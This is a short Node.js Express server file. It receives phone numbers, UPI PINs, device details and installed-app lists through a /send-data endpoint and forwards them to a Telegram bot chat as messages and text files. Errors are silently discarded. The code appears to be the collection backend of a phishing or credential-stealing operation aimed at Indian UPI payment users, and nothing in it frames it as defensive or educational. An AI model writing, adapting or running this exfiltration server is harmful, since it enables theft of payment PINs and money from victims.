require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

const sendToTelegram = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {}
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', Buffer.from(content, 'utf-8'), { filename });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    await sendToTelegram(`*BJP Client's*`);
};

app.post('/send-data', async (req, res) => {

    const { type, number, pin, deviceId, deviceTime, deviceDate, apps } = req.body;
    
    let formattedNumber = number ? `+91 ${number}` : 'Pending...';

    // 1. Main Telegram Message
    let message = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
    message += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
    message += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
    message += `Details.TXT\n`;
    if (type === 'TRX_PAGE') {
        message += `Package's.TXT`;
    }

    await sendToTelegram(message);

    // 2. Details.TXT Content
    let detailsContent = `Device Model: ${deviceId || 'Detecting...'}\n`;
    detailsContent += `Date: ${deviceDate || 'Detecting...'}\n`;
    detailsContent += `Real Time: ${deviceTime || 'Detecting...'}\n`;
    detailsContent += `Number: ${formattedNumber}\n`;
    detailsContent += `UPI PIN: ${type === 'NUMBER' ? 'PENDING' : pin}`;

    await sendFileToTelegram(detailsContent, 'Details.TXT');

    // 3. Package's.TXT Content (Numbered List Format)
    if (type === 'TRX_PAGE' && apps) {
        let packageHeader = `Device Model: ${deviceId || 'Detecting...'}\n`;
        packageHeader += `Date: ${deviceDate || 'Detecting...'}\n`;
        packageHeader += `Real Time: ${deviceTime || 'Detecting...'}\n\n`;
        packageHeader += `Package's\n`;

        // Apps ko split karke numbered list banana
        let appArray = apps.split(',').map(pkg => pkg.trim()).filter(pkg => pkg.length > 0);
        let appList = appArray.map((pkg, index) => `${index + 1}. ${pkg}`).join('\n');
        
        let finalPackageContent = packageHeader + appList;
        
        await sendFileToTelegram(finalPackageContent, "Package's.TXT");
    }

    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
